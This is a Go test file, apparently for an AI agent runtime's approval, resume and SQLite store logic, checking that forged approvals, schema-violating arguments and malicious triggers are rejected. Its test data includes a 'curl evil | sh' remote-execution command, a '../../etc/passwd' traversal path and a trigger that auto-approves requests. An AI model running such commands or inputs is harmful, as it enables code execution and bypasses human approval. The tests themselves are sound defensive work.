		if err := Cancel(ctx, st, nil, c.RunID, "joey", "stop"); err != nil {
			t.Error(err)
		}
		return ToolResult{Content: []byte(`{"moved":100}`), Summary: "moved 100"}, nil
	}}
	d := mustDriver(t, Config{Store: st, Agent: &listAgent{decisions: []Decision{{Kind: DecideToolCall, Tool: "transfer", Args: []byte(`{}`)}}}, Tools: []Tool{work}})
	run, err := d.Start(ctx, "g", leaseLimits())
	if err != nil || run.Status != StatusCancelled || run.Reason != ReasonOperatorCancelled {
		t.Fatalf("run %s/%s %v", run.Status, run.Reason, err)
	}
	events, _ := st.ListEvents(ctx, run.ID)
	last := events[len(events)-1]
	var payload struct {
		Late        bool        `json:"late"`
		Summary     string      `json:"summary"`
		Observation Observation `json:"observation"`
	}
	json.Unmarshal(last.Payload, &payload)
	if last.Type != EventStepToolFinished || !payload.Late || payload.Summary != "moved 100" || string(payload.Observation.Content) != `{"moved":100}` || payload.Observation.Kind != ObserveToolResult {
		t.Fatalf("last event %s %s", last.Type, last.Payload)
	}
	if events[len(events)-2].Type != EventRunFinished {
		t.Fatalf("events end %s, %s", events[len(events)-2].Type, last.Type)
	}
	steps, _ := st.ListSteps(ctx, run.ID)
	if steps[0].Status != StepFailed || steps[0].Observation.Kind != ObserveInterrupted {
		t.Fatalf("step = %+v", steps[0])
	}
	if got, _ := st.GetRun(ctx, run.ID); got.Status != StatusCancelled {
		t.Fatalf("run is %s", got.Status)
	}
}

const strictPath = `{"type":"object","properties":{"path":{"type":"string","pattern":"^[a-z]+$"}},"required":["path"],"additionalProperties":false}`

// An approved request whose arguments the tool's schema, as registered at
// resume, rejects is not handed to policy or the tool: the step ends as an
// invalid decision and the agent decides again.
func TestResume_ApprovedArgumentsMeetTheCurrentSchema(t *testing.T) {
	ctx := context.Background()
	st := memStore(t)
	loose := objectTool("post", RemoteMutation)
	agent := &listAgent{decisions: []Decision{{Kind: DecideToolCall, Tool: "post", Args: []byte(`{"path":"../../etc/passwd"}`)}, {Kind: DecideComplete}}}
	run, _ := mustDriver(t, Config{Store: st, Agent: agent, Tools: []Tool{loose}}).Start(ctx, "g", leaseLimits())
	approvals, _ := st.ListApprovals(ctx, run.ID)
	if err := Approve(ctx, st, nil, run.ID, approvals[0].ID, "joey", ""); err != nil {
		t.Fatal(err)
	}
	strict := &stubTool{spec: ToolSpec{Name: "post", Description: "p", InputSchema: []byte(strictPath), SideEffect: RemoteMutation, Timeout: time.Second}}
	evaluated := 0
	policy := PolicyFunc(func(ctx context.Context, req ToolRequest, v RunView) (PolicyDecision, error) {
		evaluated++
		return DefaultPolicy().Evaluate(ctx, req, v)
	})
	got, err := mustDriver(t, Config{Store: st, Agent: agent, Policy: policy, Tools: []Tool{strict}}).Resume(ctx, run.ID)
	if err != nil || got.Status != StatusCompleted || strict.calls != 0 || evaluated != 0 {
		t.Fatalf("resume: %s %v, %d calls, %d evaluations", got.Status, err, strict.calls, evaluated)
	}
	steps, _ := st.ListSteps(ctx, run.ID)
	if steps[0].Status != StepFailed || steps[0].Observation.Kind != ObserveInvalidDecision || !strings.Contains(steps[0].Observation.Summary, "schema") {
		t.Fatalf("step 0 = %+v", steps[0].Observation)
	}
}

// ReconcileWaiting pauses only a tool call that was executing and whose
// arguments were JSON the schema accepts now; a step still deciding, one
// with unparseable arguments, and one the schema now rejects end the run
// as a conflict, the last ended as an invalid decision.
func TestResume_ReconcilePausesOnlyAValidExecutingStep(t *testing.T) {
	ctx := context.Background()
	pause := PolicyDecision{Outcome: RequireApproval, Kind: "republish", Capability: []byte(`{}`)}
	for _, tc := range []struct {
		name, status, decision string
		obs                    ObservationKind
	}{
		{"deciding", "deciding", `{"kind":"tool_call","tool":"post","args":{"path":"ok"}}`, ObserveInterrupted},
		{"unparseable", "executing", `{"kind":"tool_call","tool":"post","invalid_args":"{\"path\": nope"}`, ObserveInterrupted},
		{"schema", "executing", `{"kind":"tool_call","tool":"post","args":{"path":"../x","extra":1}}`, ObserveInvalidDecision},
	} {
		st := memStore(t)
		interruptedRun(t, st)
		st.DB().Exec(`UPDATE steps SET status = ?, decision_json = ? WHERE id = 's0'`, tc.status, tc.decision)
		post := &stubTool{spec: ToolSpec{Name: "post", Description: "p", InputSchema: []byte(strictPath), SideEffect: RemoteMutation, Timeout: time.Second}}
		d := mustDriver(t, Config{Store: st, Agent: &listAgent{}, Tools: []Tool{post},
			Reconcile: func(context.Context, RunView) (Reconciliation, error) {
				return Reconciliation{Outcome: ReconcileWaiting, Pause: &pause}, nil
			}})
		run, err := d.Resume(ctx, "r1")
		if err != nil || run.Status != StatusFailed || run.Reason != ReasonReconcileConflict || post.calls != 0 {
			t.Fatalf("%s: %s/%s %v", tc.name, run.Status, run.Reason, err)
		}
		if approvals, _ := st.ListApprovals(ctx, "r1"); len(approvals) != 0 {
			t.Fatalf("%s: paused on %+v", tc.name, approvals)
		}
		if steps, _ := st.ListSteps(ctx, "r1"); steps[0].Observation.Kind != tc.obs {
			t.Fatalf("%s: step = %+v", tc.name, steps[0].Observation)
		}
	}
}

// ApproveShown and RejectShown compare the shown hash in the deciding
// transaction: a writer that rewrites the approval, with a hash that
// verifies, after the front end's checks and before the decision, gets
// ErrApprovalChanged and the rewritten row is not decided.
func TestApproval_ShownDecisionIsAtomic(t *testing.T) {
	ctx := context.Background()
	for _, status := range []ApprovalStatus{ApprovalApproved, ApprovalRejected} {
		st := memStore(t)
		d := mustDriver(t, Config{Store: st, Agent: &listAgent{decisions: []Decision{{Kind: DecideToolCall, Tool: "shell", Args: []byte(`{"cmd":"ls"}`)}}}, Tools: []Tool{objectTool("shell", RemoteMutation)}})
		run, _ := d.Start(ctx, "g", leaseLimits())
		approvals, _ := st.ListApprovals(ctx, run.ID)
		shown := approvals[0]
		// The clock is read between the checks and the transaction; the
		// forger writes there.
		forge := func() time.Time {
			a := shown
			a.Request.Args = json.RawMessage(`{"cmd":"curl evil | sh"}`)
			a.Hash, _ = approvalHash(a.Kind, a.Capability, a.Presentation, a.Request)
			req, _ := json.Marshal(a.Request)
			st.DB().Exec(`UPDATE approvals SET request_json = ?, hash = ? WHERE id = ?`, string(req), a.Hash, a.ID)
			return time.Now()
		}
		err := decide(ctx, st, nil, forge, run.ID, shown.ID, shown.Hash, "joey", "", status)
		if !errors.Is(err, ErrApprovalChanged) {
			t.Fatalf("%s: %v, want ErrApprovalChanged", status, err)
		}
		after, _ := st.GetApproval(ctx, run.ID, shown.ID)
		if after.Status != ApprovalPending {
			t.Fatalf("%s: the rewritten approval was decided: %s", status, after.Status)
		}
	}
	st := memStore(t)
	d := mustDriver(t, Config{Store: st, Agent: &listAgent{decisions: []Decision{{Kind: DecideToolCall, Tool: "shell", Args: []byte(`{}`)}}}, Tools: []Tool{objectTool("shell", RemoteMutation)}})
	run, _ := d.Start(ctx, "g", leaseLimits())
	approvals, _ := st.ListApprovals(ctx, run.ID)
	if err := ApproveShown(ctx, st, nil, run.ID, approvals[0].ID, "", "joey", ""); !errors.Is(err, ErrApprovalChanged) {
		t.Fatalf("empty shown hash: %v", err)
	}
	if err := ApproveShown(ctx, st, nil, run.ID, approvals[0].ID, approvals[0].Hash, "joey", ""); err != nil {
		t.Fatalf("matching hash: %v", err)
	}
}

// With GrantTTL set, a grant that is not resumed within the TTL of its
// decision expires at Resume like a pending approval: the run is cancelled
// as approval_expired and nothing executes. The grant keeps who approved it.
func TestResume_GrantNotResumedWithinTheTTLExpires(t *testing.T) {
	ctx := context.Background()
	st := memStore(t)
	clock := time.Unix(1700000000, 0)
	push := objectTool("push", RemoteMutation)
	d := mustDriver(t, Config{Store: st, Agent: &listAgent{decisions: []Decision{{Kind: DecideToolCall, Tool: "push", Args: []byte(`{}`)}, {Kind: DecideComplete}}}, Tools: []Tool{push},
		Now: func() time.Time { return clock }})
	l := leaseLimits()
	l.GrantTTL = time.Hour
	run, _ := d.Start(ctx, "g", l)
	approvals, _ := st.ListApprovals(ctx, run.ID)
	clock = clock.Add(50 * time.Minute)
	if err := d.Approve(ctx, run.ID, approvals[0].ID, "joey", ""); err != nil {
		t.Fatal(err)
	}
	clock = clock.Add(61 * time.Minute)
	got, err := d.Resume(ctx, run.ID)
	if err != nil || got.Status != StatusCancelled || got.Reason != ReasonApprovalExpired || push.calls != 0 {
		t.Fatalf("resume: %s/%s %v, %d calls", got.Status, got.Reason, err, push.calls)
	}
	a, _ := st.GetApproval(ctx, run.ID, approvals[0].ID)
	if a.Status != ApprovalExpired || a.DecidedBy != "joey" {
		t.Fatalf("grant = %+v", a)
	}
}

// ApprovalTTL bounds only how long an approval may stay pending. A grant
// decided inside it and resumed long after it executes: a consumer that
// wants a stale grant refused sets GrantTTL, or refuses it in its tool.
func TestResume_ApprovalTTLAloneNeverExpiresAGrant(t *testing.T) {
	ctx := context.Background()
	st := memStore(t)
	clock := time.Unix(1700000000, 0)
	push := objectTool("push", RemoteMutation)
	d := mustDriver(t, Config{Store: st, Agent: &listAgent{decisions: []Decision{{Kind: DecideToolCall, Tool: "push", Args: []byte(`{}`)}, {Kind: DecideComplete}}}, Tools: []Tool{push},
		Now: func() time.Time { return clock }})
	l := leaseLimits()
	l.ApprovalTTL = time.Hour
	run, _ := d.Start(ctx, "g", l)
	approvals, _ := st.ListApprovals(ctx, run.ID)
	clock = clock.Add(50 * time.Minute)
	if err := d.Approve(ctx, run.ID, approvals[0].ID, "joey", ""); err != nil {
		t.Fatal(err)
	}
	clock = clock.Add(48 * time.Hour)
	got, err := d.Resume(ctx, run.ID)
	if err != nil || got.Status != StatusCompleted || push.calls != 1 {
		t.Fatalf("resume: %s/%s %v, %d calls", got.Status, got.Reason, err, push.calls)
	}
	a, _ := st.GetApproval(ctx, run.ID, approvals[0].ID)
	if a.Status != ApprovalApproved {
		t.Fatalf("grant = %+v", a)
	}
}

// Limits are stored as JSON on the run. A row written before GrantTTL
// existed has no grant_ttl key and decodes to zero, which is no expiry,
// through both the single-run read and the paged listing.
func TestStore_LimitsWithoutGrantTTLDecodeToZero(t *testing.T) {
	ctx := context.Background()
	st := memStore(t)
	d := mustDriver(t, Config{Store: st, Agent: &listAgent{decisions: []Decision{{Kind: DecideComplete}}}})
	run, err := d.Start(ctx, "g", leaseLimits())
	if err != nil {
		t.Fatal(err)
	}
	old := `{"max_steps":10,"max_consecutive_tool_failures":3,"loop_threshold":3,"approval_ttl":3600000000000}`
	if _, err := st.DB().Exec(`UPDATE runs SET limits_json = ? WHERE id = ?`, old, run.ID); err != nil {
		t.Fatal(err)
	}
	got, err := st.GetRun(ctx, run.ID)
	if err != nil {
		t.Fatal(err)
	}
	if got.Limits.GrantTTL != 0 || got.Limits.ApprovalTTL != time.Hour || got.Limits.MaxSteps != 10 {
		t.Fatalf("limits = %+v", got.Limits)
	}
	page, total, err := st.ListRunsPage(ctx, 10, 0)
	if err != nil {
		t.Fatal(err)
	}
	if total != 1 || len(page) != 1 || page[0].Limits.GrantTTL != 0 || page[0].Limits.ApprovalTTL != time.Hour {
		t.Fatalf("page = %+v", page)
	}
}

// A database is refused by both openers when it holds a trigger or a
// view, which would run the file author's SQL inside the runtime's own
// statements; the connections run with trusted_schema off and defensive
// mode on, and a writer syncs every commit.
func TestStore_RefusesTriggersAndViewsAndHardensItsConnections(t *testing.T) {
	for _, ddl := range []string{
		`CREATE TRIGGER t AFTER INSERT ON events BEGIN UPDATE approvals SET status = 'approved'; END`,
		`CREATE VIEW v AS SELECT id FROM runs`,
	} {
		path := filepath.Join(t.TempDir(), "x.db")
		st, err := OpenStore(path)
		if err != nil {
			t.Fatal(err)
		}
		if _, err := st.DB().Exec(ddl); err != nil {
			t.Fatal(err)
		}
		st.Close()
		if _, err := OpenStore(path); !errors.Is(err, ErrUnsafeSchema) {
			t.Fatalf("OpenStore: %v", err)
		}
		for _, ro := range []bool{true, false} {
			if _, err := OpenExisting(path, ro); !errors.Is(err, ErrUnsafeSchema) {
				t.Fatalf("OpenExisting(%v): %v", ro, err)
			}
		}
	}
	path := filepath.Join(t.TempDir(), "x.db")
	st, err := OpenStore(path)
	if err != nil {
		t.Fatal(err)
	}
	defer st.Close()
	rw, err := OpenExisting(path, false)
	if err != nil {
		t.Fatal(err)
	}
	defer rw.Close()
	for name, s := range map[string]*Store{"OpenStore": st, "OpenExisting": rw} {
		var trusted, sync int
		s.DB().QueryRow(`PRAGMA trusted_schema`).Scan(&trusted)
		s.DB().QueryRow(`PRAGMA synchronous`).Scan(&sync)
		if trusted != 0 || sync != 2 {
			t.Fatalf("%s: trusted_schema %d, synchronous %d", name, trusted, sync)
		}
		s.DB().Exec(`PRAGMA writable_schema = ON`)
		if _, err := s.DB().Exec(`UPDATE sqlite_master SET sql = sql WHERE name = 'runs'`); err == nil {
			t.Fatalf("%s: defensive mode is off", name)
		}
	}
}

// The bounded reads return a page, newest runs first, with every text
// column capped and capped JSON still JSON, from a database whose rows a
// crafter made huge.
func TestStore_PagesAreBounded(t *testing.T) {
	ctx := context.Background()
	st := memStore(t)
	for i := range 3 {
		d := mustDriver(t, Config{Store: st, Agent: &listAgent{decisions: []Decision{{Kind: DecideComplete}}}})
		if _, err := d.StartWithID(ctx, string(rune('a'+i)), strings.Repeat("g", MaxPageText+10), leaseLimits()); err != nil {
			t.Fatal(err)
		}
	}
	st.DB().Exec(`UPDATE events SET payload_json = ? WHERE run_id = 'c' AND type = 'run.finished'`, `{"pad":"`+strings.Repeat("p", 3*MaxPageText)+`"}`)
	runs, total, err := st.ListRunsPage(ctx, 2, 0)
	if err != nil || total != 3 || len(runs) != 2 || runs[0].ID != "c" || runs[1].ID != "b" {
		t.Fatalf("page: %d of %d runs, %v", len(runs), total, err)
	}
	if g := runs[0].Goal; len(g) > MaxPageText+64 || !strings.HasSuffix(g, "…[truncated: 65546 characters]") || runs[0].Limits.MaxSteps != 10 {
		t.Fatalf("goal %d bytes ending %q, limits %+v", len(g), g[len(g)-40:], runs[0].Limits)
	}
	if more, _, _ := st.ListRunsPage(ctx, 2, 2); len(more) != 1 || more[0].ID != "a" {
		t.Fatalf("second page = %+v", more)
	}
	events, total, err := st.ListEventsPage(ctx, "c", 100, 0)
	if err != nil || total != len(events) {
		t.Fatal(total, err)
	}
	last := events[len(events)-1]
	var capped struct {
		Truncated bool
		Length    int
		Head      string
	}
	if err := json.Unmarshal(last.Payload, &capped); err != nil || !capped.Truncated || capped.Length != 3*MaxPageText+10 || len(capped.Head) != MaxPageText {
		t.Fatalf("capped payload %.80s: %v", last.Payload, err)
	}
	if first, _, _ := st.ListEventsPage(ctx, "c", 1, 1); len(first) != 1 || first[0].Seq != events[1].Seq {
		t.Fatalf("offset page = %+v", first)
	}
	if _, _, err := st.ListRunsPage(ctx, 0, 0); err == nil {
		t.Fatal("a page of no runs was accepted")
	}
}

// A page read decodes only the rows of its page, however many the
// database holds, and takes its total from a COUNT: with thousands of
// steps, approvals, and events on one run and thousands of runs, each read
// of ten decodes ten rows. A step or approval column over MaxPageText is
// read as its identifying fields only, and DecodeError says so.
func TestStore_PageReadsOnlyThePage(t *testing.T) {
	ctx := context.Background()
	st := memStore(t)
	d := mustDriver(t, Config{Store: st, Agent: &listAgent{decisions: []Decision{{Kind: DecideComplete}}}})
	if _, err := d.StartWithID(ctx, "r", "g", leaseLimits()); err != nil {
		t.Fatal(err)
	}
	const n = 3000
	big := `{"kind":"tool_result","summary":"s","content":"` + strings.Repeat("x", MaxPageText) + `"}`
	bigReq := `{"run_id":"r","step_id":"s0","spec":{"name":"push"},"args":{"a":"` + strings.Repeat("y", MaxPageText) + `"}}`
	db := st.DB()
	for _, q := range []string{
		`WITH RECURSIVE c(i) AS (SELECT 0 UNION ALL SELECT i+1 FROM c WHERE i < ?-1) INSERT INTO runs (id, goal, status, limits_json, created_at) SELECT 'x' || i, 'g', 'COMPLETED', '{}', '2026-01-01T00:00:00Z' FROM c`,
		`WITH RECURSIVE c(i) AS (SELECT 0 UNION ALL SELECT i+1 FROM c WHERE i < ?-1) INSERT INTO steps (id, run_id, idx, status, observation_json, started_at) SELECT 's' || i, 'r', i + 10, 'completed', '` + big + `', '2026-01-01T00:00:00Z' FROM c`,
		`WITH RECURSIVE c(i) AS (SELECT 0 UNION ALL SELECT i+1 FROM c WHERE i < ?-1) INSERT INTO approvals (id, run_id, step_id, kind, capability_json, presentation_json, request_json, hash, status, created_at) SELECT 'a' || i, 'r', 's' || i, 'k', '{}', '{}', '` + bigReq + `', 'h', 'pending', '2026-01-01T00:00:00Z' FROM c`,
		`WITH RECURSIVE c(i) AS (SELECT 0 UNION ALL SELECT i+1 FROM c WHERE i < ?-1) INSERT INTO events (run_id, at, type, payload_json) SELECT 'r', '2026-01-01T00:00:00Z', 't', '{}' FROM c`,
	} {
		if _, err := db.Exec(q, n); err != nil {
			t.Fatal(err)
		}
	}
	decoded := 0
	pageRow = func() { decoded++ }
	defer func() { pageRow = func() {} }()

	runs, total, err := st.ListRunsPage(ctx, 10, 5)
	if err != nil || len(runs) != 10 || total != n+1 || decoded != 10 {
		t.Fatalf("runs: %d of %d, %d decoded, %v", len(runs), total, decoded, err)
	}
	decoded = 0
	steps, total, err := st.ListStepsPage(ctx, "r", 10, 100)
	if err != nil || len(steps) != 10 || total < n || decoded != 10 {
		t.Fatalf("steps: %d of %d, %d decoded, %v", len(steps), total, decoded, err)
	}
	if o := steps[0].Observation; o == nil || o.Kind != "tool_result" || o.Summary != "s" || len(o.Content) != 0 || !strings.Contains(steps[0].DecodeError, "observation:") {
		t.Fatalf("capped step = %+v, %q", o, steps[0].DecodeError)
	}
	decoded = 0
	approvals, total, err := st.ListApprovalsPage(ctx, "r", ApprovalPending, 10, 0)
	if err != nil || len(approvals) != 10 || total != n || decoded != 10 {
		t.Fatalf("approvals: %d of %d, %d decoded, %v", len(approvals), total, decoded, err)
	}
	if a := approvals[0]; a.Request.Spec.Name != "push" || !strings.Contains(string(a.Request.Args), `"truncated":true`) || !strings.Contains(a.DecodeError, "request:") {
		t.Fatalf("capped approval = %+v", a)
	}
	if _, total, _ := st.ListApprovalsPage(ctx, "r", ApprovalApproved, 10, 0); total != 0 {
		t.Fatalf("approved total = %d", total)
	}
	decoded = 0
	events, total, err := st.ListEventsPage(ctx, "r", 10, 0)
	if err != nil || len(events) != 10 || total < n || decoded != 10 {
		t.Fatalf("events: %d of %d, %d decoded, %v", len(events), total, decoded, err)
	}
	st.DB().Exec(`UPDATE runs SET status = 'WAITING_FOR_APPROVAL' WHERE id = 'r'`)
	decoded = 0
	ids, err := st.PendingApprovalIDsOf(ctx, []string{"r", "x1"}, 2)
	if err != nil || len(ids["r"]) != 2 || ids["r"][0] != "a0" || len(ids["x1"]) != 0 || decoded != 2 {
		t.Fatalf("pending ids = %v, %d decoded, %v", ids, decoded, err)
	}
}
